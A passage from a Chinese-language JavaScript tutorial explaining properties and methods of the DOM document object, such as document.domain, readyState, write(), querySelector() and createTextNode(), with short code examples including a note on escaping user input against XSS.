<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.URL</span><br><span class="line"><span class="comment">// http://www.example.com/about</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.documentURI === <span class="built_in">document</span>.URL</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>如果文档的锚点（<code>#anchor</code>）变化，这两个属性都会跟着变化。</p>
<h6 id="2-document-domain"><a href="#2-document-domain" class="headerlink" title="(2)document.domain"></a>(2)document.domain</h6><p><code>document.domain</code>属性返回当前文档的域名，不包含协议和端口。比如，网页的网址是<code>http://www.example.com:80/hello.html</code>，那么<code>document.domain</code>属性就等于<code>www.example.com</code>。如果无法获取域名，该属性返回<code>null</code>。</p>
<p><code>document.domain</code>基本上是一个只读属性，只有一种情况除外。次级域名的网页，可以把<code>document.domain</code>设为对应的上级域名。比如，当前域名是<code>a.sub.example.com</code>，则<code>document.domain</code>属性可以设置为<code>sub.example.com</code>，也可以设为<code>example.com</code>。修改后，<code>document.domain</code>相同的两个网页，可以读取对方的资源，比如设置的 Cookie。</p>
<p>另外，设置<code>document.domain</code>会导致端口被改成<code>null</code>。因此，如果通过设置<code>document.domain</code>来进行通信，双方网页都必须设置这个值，才能保证端口相同。</p>
<h6 id="3-document-location"><a href="#3-document-location" class="headerlink" title="(3)document.location"></a>(3)document.location</h6><p><code>Location</code>对象是浏览器提供的原生对象，提供 URL 相关的信息和操作方法。通过<code>window.location</code>和<code>document.location</code>属性，可以拿到这个对象。</p>
<p>关于这个对象的详细介绍，请看《浏览器模型》部分的《Location 对象》章节。</p>
<h6 id="4-document-lastModified"><a href="#4-document-lastModified" class="headerlink" title="(4)document.lastModified"></a>(4)document.lastModified</h6><p><code>document.lastModified</code>属性返回一个字符串，表示当前文档最后修改的时间。不同浏览器的返回值，日期格式是不一样的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.lastModified</span><br><span class="line"><span class="comment">// &quot;03/07/2018 11:18:27&quot;</span></span><br></pre></td></tr></table></figure>
<p>注意，<code>document.lastModified</code>属性的值是字符串，所以不能直接用来比较。<code>Date.parse</code>方法将其转为<code>Date</code>实例，才能比较两个网页。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> lastVisitedDate = <span class="built_in">Date</span>.parse(<span class="string">&#x27;01/01/2018&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Date</span>.parse(<span class="built_in">document</span>.lastModified) &gt; lastVisitedDate) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;网页已经变更&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果页面上有 JavaScript 生成的内容，<code>document.lastModified</code>属性返回的总是当前时间。</p>
<h6 id="5-document-title"><a href="#5-document-title" class="headerlink" title="(5)document.title"></a>(5)document.title</h6><p><code>document.title</code>属性返回当前文档的标题。默认情况下，返回<code>&lt;title&gt;</code>节点的值。但是该属性是可写的，一旦被修改，就返回修改后的值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.title = <span class="string">&#x27;新标题&#x27;</span>;</span><br><span class="line"><span class="built_in">document</span>.title <span class="comment">// &quot;新标题&quot;</span></span><br></pre></td></tr></table></figure>

<h6 id="6-document-characterSet"><a href="#6-document-characterSet" class="headerlink" title="(6)document.characterSet"></a>(6)document.characterSet</h6><p><code>document.characterSet</code>属性返回当前文档的编码，比如<code>UTF-8</code>、<code>ISO-8859-1</code>等等。</p>
<h6 id="7-document-referrer"><a href="#7-document-referrer" class="headerlink" title="(7)document.referrer"></a>(7)document.referrer</h6><p><code>document.referrer</code>属性返回一个字符串，表示当前文档的访问者来自哪里。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.referrer</span><br><span class="line"><span class="comment">// &quot;https://example.com/path&quot;</span></span><br></pre></td></tr></table></figure>
<p>如果无法获取来源，或者用户直接键入网址而不是从其他网页点击进入，<code>document.referrer</code>返回一个空字符串。</p>
<p><code>document.referrer</code>的值，总是与 HTTP 头信息的<code>Referer</code>字段保持一致。但是，<code>document.referrer</code>的拼写有两个<code>r</code>，而头信息的<code>Referer</code>字段只有一个<code>r</code>。</p>
<h6 id="8-document-dir"><a href="#8-document-dir" class="headerlink" title="(8)document.dir"></a>(8)document.dir</h6><p><code>document.dir</code>返回一个字符串，表示文字方向。它只有两个可能的值：rtl表示文字从右到左，阿拉伯文是这种方式；ltr表示文字从左到右，包括英语和汉语在内的大多数文字采用这种方式。</p>
<h6 id="9-document-compatMode"><a href="#9-document-compatMode" class="headerlink" title="(9)document.compatMode"></a>(9)document.compatMode</h6><p><code>compatMode</code>属性返回浏览器处理文档的模式，可能的值为<code>BackCompat</code>（向后兼容模式）和<code>CSS1Compat</code>（严格模式）。</p>
<p>一般来说，如果网页代码的第一行设置了明确的<code>DOCTYPE</code>（比如<code>&lt;!doctype html&gt;</code>），<code>document.compatMode</code>的值都为<code>CSS1Compat</code>。</p>
<h5 id="5-2-4-文档状态属性"><a href="#5-2-4-文档状态属性" class="headerlink" title="5.2.4 文档状态属性"></a>5.2.4 文档状态属性</h5><h6 id="1-document-hidden"><a href="#1-document-hidden" class="headerlink" title="(1)document.hidden"></a>(1)document.hidden</h6><p><code>document.hidden</code>属性返回一个布尔值，表示当前页面是否可见。如果窗口最小化、浏览器切换了 Tab，都会导致导致页面不可见，使得<code>document.hidden</code>返回<code>true</code>。</p>
<p>这个属性是 Page Visibility API 引入的，一般都是配合这个 API 使用。</p>
<h6 id="2-document-visibilityState"><a href="#2-document-visibilityState" class="headerlink" title="(2)document.visibilityState"></a>(2)document.visibilityState</h6><p><code>document.visibilityState</code>返回文档的可见状态。</p>
<p>它的值有四种可能。<br>`</p>
<ul>
<li><code>visible</code>：页面可见。注意，页面可能是部分可见，即不是焦点窗口，前面被其他窗口部分挡住了。</li>
<li><code>hidden</code>：页面不可见，有可能窗口最小化，或者浏览器切换到了另一个 Tab。</li>
<li><code>prerender</code>：页面处于正在渲染状态，对于用户来说，该页面不可见。</li>
<li><code>unloaded</code>：页面从内存里面卸载了。<br>`<br>这个属性可以用在页面加载时，防止加载某些资源；或者页面不可见时，停掉一些页面功能。</li>
</ul>
<h6 id="3-document-readyState"><a href="#3-document-readyState" class="headerlink" title="(3)document.readyState"></a>(3)document.readyState</h6><p><code>document.readyState</code>属性返回当前文档的状态，共有三种可能的值。</p>
<ul>
<li><code>loading</code>：加载 HTML 代码阶段（尚未完成解析）</li>
<li><code>interactive</code>：加载外部资源阶段</li>
<li><code>complete</code>：加载完成</li>
</ul>
<p>这个属性变化的过程如下。</p>
<ol>
<li>浏览器开始解析 HTML 文档，<code>document.readyState</code>属性等于<code>loading</code>。</li>
<li>浏览器遇到 HTML 文档中的<code>&lt;script&gt;</code>元素，并且没有<code>async</code>或<code>defer</code>属性，就暂停解析，开始执行脚本，这时<code>document.readyState</code>属性还是等于<code>loading</code>。</li>
<li>HTML 文档解析完成，<code>document.readyState</code>属性变成<code>interactive</code>。</li>
<li>浏览器等待图片、样式表、字体文件等外部资源加载完成，一旦全部加载完成，<code>document.readyState</code>属性变成<code>complete</code>。</li>
</ol>
<p>下面的代码用来检查网页是否加载成功。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 基本检查</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">document</span>.readyState === <span class="string">&#x27;complete&#x27;</span>) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 轮询检查</span></span><br><span class="line"><span class="keyword">var</span> interval = <span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">document</span>.readyState === <span class="string">&#x27;complete&#x27;</span>) &#123;</span><br><span class="line">    <span class="built_in">clearInterval</span>(interval);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;, <span class="number">100</span>);</span><br></pre></td></tr></table></figure>
<p>另外，每次状态变化都会触发一个<code>readystatechange</code>事件。</p>
<h5 id="5-2-5-document-cookie"><a href="#5-2-5-document-cookie" class="headerlink" title="5.2.5 document.cookie"></a>5.2.5 document.cookie</h5><p><code>document.cookie</code>属性用来操作浏览器 Cookie，详见《浏览器模型》部分的《Cookie》章节。</p>
<h5 id="5-2-6-document-designMode"><a href="#5-2-6-document-designMode" class="headerlink" title="5.2.6 document.designMode"></a>5.2.6 document.designMode</h5><p><code>document.designMode</code>属性控制当前文档是否可编辑。该属性只有两个值<code>on</code>和<code>off</code>，默认值为<code>off</code>。一旦设为<code>on</code>，用户就可以编辑整个文档的内容。</p>
<p>下面代码打开<code>iframe</code>元素内部文档的<code>designMode</code>属性，就能将其变为一个所见即所得的编辑器。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;iframe id=&quot;editor&quot; src=&quot;about:blank&quot;&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="keyword">var</span> editor = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;editor&#x27;</span>);</span><br><span class="line">editor.contentDocument.designMode = <span class="string">&#x27;on&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h5 id="5-2-7-document-currentScript"><a href="#5-2-7-document-currentScript" class="headerlink" title="5.2.7 document.currentScript"></a>5.2.7 document.currentScript</h5><p><code>document.currentScript</code>属性只用在<code>&lt;script&gt;</code>元素的内嵌脚本或加载的外部脚本之中，返回当前脚本所在的那个 DOM 节点，即<code>&lt;script&gt;</code>元素的 DOM 节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script id=<span class="string">&quot;foo&quot;</span>&gt;</span><br><span class="line">  <span class="built_in">console</span>.log(</span><br><span class="line">    <span class="built_in">document</span>.currentScript === <span class="built_in">document</span>.getElementById(<span class="string">&#x27;foo&#x27;</span>)</span><br><span class="line">  ); <span class="comment">// true</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>document.currentScript</code>就是<code>&lt;script&gt;</code>元素节点。</p>
<h5 id="5-2-8-document-implementation"><a href="#5-2-8-document-implementation" class="headerlink" title="5.2.8 document.implementation"></a>5.2.8 document.implementation</h5><p><code>document.implementation</code>属性返回一个<code>DOMImplementation</code>对象。该对象有三个方法，主要用于创建独立于当前文档的新的 Document 对象</p>
<ul>
<li><code>DOMImplementation.createDocument()</code>：创建一个 XML 文档。</li>
<li><code>DOMImplementation.createHTMLDocument()</code>：创建一个 HTML 文档。</li>
<li><code>DOMImplementation.createDocumentType()</code>：创建一个 DocumentType 对象。</li>
</ul>
<p>下面是创建 HTML 文档的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> doc = <span class="built_in">document</span>.implementation.createHTMLDocument(<span class="string">&#x27;Title&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> p = doc.createElement(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line">p.innerHTML = <span class="string">&#x27;hello world&#x27;</span>;</span><br><span class="line">doc.body.appendChild(p);</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.replaceChild(</span><br><span class="line">  doc.documentElement,</span><br><span class="line">  <span class="built_in">document</span>.documentElement</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>上面代码中，第一步生成一个新的 HTML 文档doc，然后用它的根元素<code>document.documentElement</code>替换掉<code>document.documentElement</code>。这会使得当前文档的内容全部消失，变成<code>hello world</code>。</p>
<h4 id="5-3-方法"><a href="#5-3-方法" class="headerlink" title="5.3 方法"></a>5.3 方法</h4><h5 id="5-3-1-document-open-，document-close"><a href="#5-3-1-document-open-，document-close" class="headerlink" title="5.3.1 document.open()，document.close()"></a>5.3.1 document.open()，document.close()</h5><p><code>document.open</code>方法清除当前文档所有内容，使得文档处于可写状态，供<code>document.write</code>方法写入内容。</p>
<p><code>document.close</code>方法用来关闭<code>document.open()</code>打开的文档。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.open();</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&#x27;hello world&#x27;</span>);</span><br><span class="line"><span class="built_in">document</span>.close();</span><br></pre></td></tr></table></figure>

<h5 id="5-3-2-document-write-，document-writeln"><a href="#5-3-2-document-write-，document-writeln" class="headerlink" title="5.3.2 document.write()，document.writeln()"></a>5.3.2 document.write()，document.writeln()</h5><p><code>document.write</code>方法用于向当前文档写入内容。</p>
<p>在网页的首次渲染阶段，只要页面没有关闭写入（即没有执行<code>document.close()</code>），<code>document.write</code>写入的内容就会追加在已有内容的后面。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 页面显示“helloworld”</span></span><br><span class="line"><span class="built_in">document</span>.open();</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&#x27;world&#x27;</span>);</span><br><span class="line"><span class="built_in">document</span>.close();</span><br></pre></td></tr></table></figure>
<p>注意，<code>document.write</code>会当作 HTML 代码解析，不会转义。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.write(<span class="string">&#x27;&lt;p&gt;hello world&lt;/p&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>document.write</code>会将<code>&lt;p&gt;</code>当作 HTML 标签解释。</p>
<p>如果页面已经解析完成（<code>DOMContentLoaded</code>事件发生之后），再调用<code>write</code>方法，它会先调用<code>open</code>方法，擦除当前文档所有内容，然后再写入。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">document</span>.write(<span class="string">&#x27;&lt;p&gt;Hello World!&lt;/p&gt;&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">document</span>.open();</span><br><span class="line">  <span class="built_in">document</span>.write(<span class="string">&#x27;&lt;p&gt;Hello World!&lt;/p&gt;&#x27;</span>);</span><br><span class="line">  <span class="built_in">document</span>.close();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>如果在页面渲染过程中调用<code>write</code>方法，并不会自动调用<code>open</code>方法。（可以理解成，<code>open</code>方法已调用，但<code>close</code>方法还未调用。）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">hello</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">  <span class="built_in">document</span>.write(<span class="string">&quot;world&quot;</span>)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>在浏览器打开上面网页，将会显示<code>hello world</code>。</p>
<p><code>document.write</code>是 JavaScript 语言标准化之前就存在的方法，现在完全有更符合标准的方法向文档写入内容（比如对<code>innerHTML</code>属性赋值）。所以，除了某些特殊情况，应该尽量避免使用document.write这个方法。</p>
<p><code>document.writeln</code>方法与<code>write</code>方法完全一致，除了会在输出内容的尾部添加换行符。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.write(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="number">2</span>);</span><br><span class="line"><span class="comment">// 12</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.writeln(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">document</span>.writeln(<span class="number">2</span>);</span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure>
<p>注意，<code>writeln</code>方法添加的是 ASCII 码的换行符，渲染成 HTML 网页时不起作用，即在网页上显示不出换行。网页上的换行，必须显式写入<code>&lt;br&gt;</code>。</p>
<h5 id="5-3-3-document-querySelector-，document-querySelectorAll"><a href="#5-3-3-document-querySelector-，document-querySelectorAll" class="headerlink" title="5.3.3 document.querySelector()，document.querySelectorAll()"></a>5.3.3 document.querySelector()，document.querySelectorAll()</h5><p><code>document.querySelector</code>方法接受一个 CSS 选择器作为参数，返回匹配该选择器的元素节点。如果有多个节点满足匹配条件，则返回第一个匹配的节点。如果没有发现匹配的节点，则返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> el1 = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;.myclass&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> el2 = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;#myParent &gt; [ng-click]&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><code>document.querySelectorAll</code>方法与<code>querySelector</code>用法类似，区别是返回一个<code>NodeList</code>对象，包含所有匹配给定选择器的节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">elementList = <span class="built_in">document</span>.querySelectorAll(<span class="string">&#x27;.myclass&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>这两个方法的参数，可以是逗号分隔的多个 CSS 选择器，返回匹配其中一个选择器的元素节点，这与 CSS 选择器的规则是一致的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> matches = <span class="built_in">document</span>.querySelectorAll(<span class="string">&#x27;div.note, div.alert&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码返回<code>class</code>属性是<code>note</code>或<code>alert</code>的<code>div</code>元素。</p>
<p>这两个方法都支持复杂的 CSS 选择器。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 选中 data-foo-bar 属性等于 someval 的元素</span></span><br><span class="line"><span class="built_in">document</span>.querySelectorAll(<span class="string">&#x27;[data-foo-bar=&quot;someval&quot;]&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 选中 myForm 表单中所有不通过验证的元素</span></span><br><span class="line"><span class="built_in">document</span>.querySelectorAll(<span class="string">&#x27;#myForm :invalid&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 选中div元素，那些 class 含 ignore 的除外</span></span><br><span class="line"><span class="built_in">document</span>.querySelectorAll(<span class="string">&#x27;DIV:not(.ignore)&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 同时选中 div，a，script 三类元素</span></span><br><span class="line"><span class="built_in">document</span>.querySelectorAll(<span class="string">&#x27;DIV, A, SCRIPT&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>但是，它们不支持 CSS 伪元素的选择器（比如<code>:first-line</code>和<code>:first-letter</code>）和伪类的选择器（比如<code>:link</code>和<code>:visited</code>），即无法选中伪元素和伪类。</p>
<p>如果<code>querySelectorAll</code>方法的参数是字符串<code>*</code>，则会返回文档中的所有元素节点。另外，<code>querySelectorAll</code>的返回结果不是动态集合，不会实时反映元素节点的变化。</p>
<p>最后，这两个方法除了定义在<code>document</code>对象上，还定义在元素节点上，即在元素节点上也可以调用。</p>
<h5 id="5-3-4-document-getElementsByTagName"><a href="#5-3-4-document-getElementsByTagName" class="headerlink" title="5.3.4 document.getElementsByTagName()"></a>5.3.4 document.getElementsByTagName()</h5><p><code>document.getElementsByTagName()</code>方法搜索 HTML 标签名，返回符合条件的元素。它的返回值是一个类似数组对象（<code>HTMLCollection</code>实例），可以实时反映 HTML 文档的变化。如果没有任何匹配的元素，就返回一个空集。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> paras = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line">paras <span class="keyword">instanceof</span> HTMLCollection <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码返回当前文档的所有<code>p</code>元素节点。</p>
<p>HTML 标签名是大小写不敏感的，因此<code>getElementsByTagName()</code>方法的参数也是大小写不敏感的。另外，返回结果中，各个成员的顺序就是它们在文档中出现的顺序。</p>
<p>如果传入<code>*</code>，就可以返回文档中所有 HTML 元素。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> allElements = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;*&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>注意，元素节点本身也定义了<code>getElementsByTagName</code>方法，返回该元素的后代元素中符合条件的元素。也就是说，这个方法不仅可以在<code>document</code>对象上调用，也可以在任何元素节点上调用。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> firstPara = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;p&#x27;</span>)[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">var</span> spans = firstPara.getElementsByTagName(<span class="string">&#x27;span&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码选中第一个<code>p</code>元素内部的所有<code>span</code>元素。</p>
<h5 id="5-3-5-document-getElementsByClassName"><a href="#5-3-5-document-getElementsByClassName" class="headerlink" title="5.3.5 document.getElementsByClassName()"></a>5.3.5 document.getElementsByClassName()</h5><p><code>document.getElementsByClassName()</code>方法返回一个类似数组的对象（<code>HTMLCollection</code>实例），包括了所有<code>class</code>名字符合指定条件的元素，元素的变化实时反映在返回结果中。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> elements = <span class="built_in">document</span>.getElementsByClassName(names);</span><br></pre></td></tr></table></figure>
<p>由于<code>class</code>是保留字，所以 JavaScript 一律使用<code>className</code>表示 CSS 的<code>class</code>。<br>参数可以是多个<code>class</code>，它们之间使用空格分隔。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> elements = <span class="built_in">document</span>.getElementsByClassName(<span class="string">&#x27;foo bar&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码返回同时具有<code>foo</code>和<code>bar</code>两个<code>class</code>的元素，<code>foo</code>和<code>bar</code>的顺序不重要。</p>
<p>注意，正常模式下，CSS 的<code>class</code>是大小写敏感的。（<code>quirks mode</code>下，大小写不敏感。）</p>
<p>与<code>getElementsByTagName()</code>方法一样，<code>getElementsByClassName()</code>方法不仅可以在<code>document</code>对象上调用，也可以在任何元素节点上调用。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 非document对象上调用</span></span><br><span class="line"><span class="keyword">var</span> elements = rootElement.getElementsByClassName(names);</span><br></pre></td></tr></table></figure>

<h5 id="5-3-6-document-getElementsByName"><a href="#5-3-6-document-getElementsByName" class="headerlink" title="5.3.6 document.getElementsByName()"></a>5.3.6 document.getElementsByName()</h5><p><code>document.getElementsByName()</code>方法用于选择拥有<code>name</code>属性的 HTML 元素（比如<code>&lt;form&gt;</code>、<code>&lt;radio&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;frame&gt;</code>、<code>&lt;embed&gt;</code>和<code>&lt;object&gt;</code>等），返回一个类似数组的的对象（<code>NodeList</code>实例），因为<code>name</code>属性相同的元素可能不止一个。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 表单为 &lt;form name=&quot;x&quot;&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="keyword">var</span> forms = <span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">forms[<span class="number">0</span>].tagName <span class="comment">// &quot;FORM&quot;</span></span><br></pre></td></tr></table></figure>

<h5 id="5-3-7-document-getElementById"><a href="#5-3-7-document-getElementById" class="headerlink" title="5.3.7 document.getElementById()"></a>5.3.7 document.getElementById()</h5><p><code>document.getElementById()</code>方法返回匹配指定<code>id</code>属性的元素节点。如果没有发现匹配的节点，则返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> elem = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;para1&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>注意，该方法的参数是大小写敏感的。比如，如果某个节点的<code>id</code>属性是<code>main</code>，那么<code>document.getElementById(&#39;Main&#39;)</code>将返回<code>null</code>。</p>
<p><code>document.getElementById()</code>方法与<code>document.querySelector()</code>方法都能获取元素节点，不同之处是<code>document.querySelector()</code>方法的参数使用 CSS 选择器语法，<code>document.getElementById()</code>方法的参数是元素的<code>id</code>属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&#x27;myElement&#x27;</span>)</span><br><span class="line"><span class="built_in">document</span>.querySelector(<span class="string">&#x27;#myElement&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>上面代码中，两个方法都能选中<code>id</code>为<code>myElement</code>的元素，但是<code>document.getElementById()</code>比<code>document.querySelector()</code>效率高得多。</p>
<p>另外，这个方法只能在<code>document</code>对象上使用，不能在其他元素节点上使用。</p>
<h5 id="5-3-8-document-elementFromPoint-，document-elementsFromPoint"><a href="#5-3-8-document-elementFromPoint-，document-elementsFromPoint" class="headerlink" title="5.3.8 document.elementFromPoint()，document.elementsFromPoint()"></a>5.3.8 document.elementFromPoint()，document.elementsFromPoint()</h5><p><code>document.elementFromPoint()</code>方法返回位于页面指定位置最上层的元素节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> element = <span class="built_in">document</span>.elementFromPoint(<span class="number">50</span>, <span class="number">50</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码选中在<code>(50, 50)</code>这个坐标位置的最上层的那个 HTML 元素。</p>
<p><code>elementFromPoint</code>方法的两个参数，依次是相对于当前视口左上角的横坐标和纵坐标，单位是像素。如果位于该位置的 HTML 元素不可返回（比如文本框的滚动条），则返回它的父元素（比如文本框）。如果坐标值无意义（比如负值或超过视口大小），则返回<code>null</code>。</p>
<p><code>document.elementsFromPoint()</code>返回一个数组，成员是位于指定坐标（相对于视口）的所有元素。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> elements = <span class="built_in">document</span>.elementsFromPoint(x, y);</span><br></pre></td></tr></table></figure>

<h5 id="5-3-9-document-createElement"><a href="#5-3-9-document-createElement" class="headerlink" title="5.3.9 document.createElement()"></a>5.3.9 document.createElement()</h5><p><code>document.createElement</code>方法用来生成元素节点，并返回该节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> newDiv = <span class="built_in">document</span>.createElement(<span class="string">&#x27;div&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><code>createElement</code>方法的参数为元素的标签名，即元素节点的<code>tagName</code>属性，对于 HTML 网页大小写不敏感，即参数为<code>div</code>或<code>DIV</code>返回的是同一种节点。如果参数里面包含尖括号（即<code>&lt;</code>和<code>&gt;</code>）会报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.createElement(<span class="string">&#x27;&lt;div&gt;&#x27;</span>);</span><br><span class="line"><span class="comment">// DOMException: The tag name provided (&#x27;&lt;div&gt;&#x27;) is not a valid name</span></span><br></pre></td></tr></table></figure>
<p>注意，<code>document.createElement</code>的参数可以是自定义的标签名。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.createElement(<span class="string">&#x27;foo&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h5 id="5-3-10-document-createTextNode"><a href="#5-3-10-document-createTextNode" class="headerlink" title="5.3.10 document.createTextNode()"></a>5.3.10 document.createTextNode()</h5><p><code>document.createTextNode</code>方法用来生成文本节点（Text实例），并返回该节点。它的参数是文本节点的内容。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> newDiv = <span class="built_in">document</span>.createElement(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> newContent = <span class="built_in">document</span>.createTextNode(<span class="string">&#x27;Hello&#x27;</span>);</span><br><span class="line">newDiv.appendChild(newContent);</span><br></pre></td></tr></table></figure>
<p>上面代码新建一个<code>div</code>节点和一个文本节点，然后将文本节点插入<code>div</code>节点。</p>
<p>这个方法可以确保返回的节点，被浏览器当作文本渲染，而不是当作 HTML 代码渲染。因此，可以用来展示用户的输入，避免 XSS 攻击。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.createElement(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">div.appendChild(<span class="built_in">document</span>.createTextNode(<span class="string">&#x27;&lt;span&gt;Foo &amp; bar&lt;/span&gt;&#x27;</span>));</span><br><span class="line"><span class="built_in">console</span>.log(div.innerHTML)</span><br><span class="line"><span class="comment">// &amp;lt;span&amp;gt;Foo &amp;amp; bar&amp;lt;/span&amp;gt;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>createTextNode</code>方法对大于号和小于号进行转义，从而保证即使用户输入的内容包含恶意代码，也能正确显示。</p>
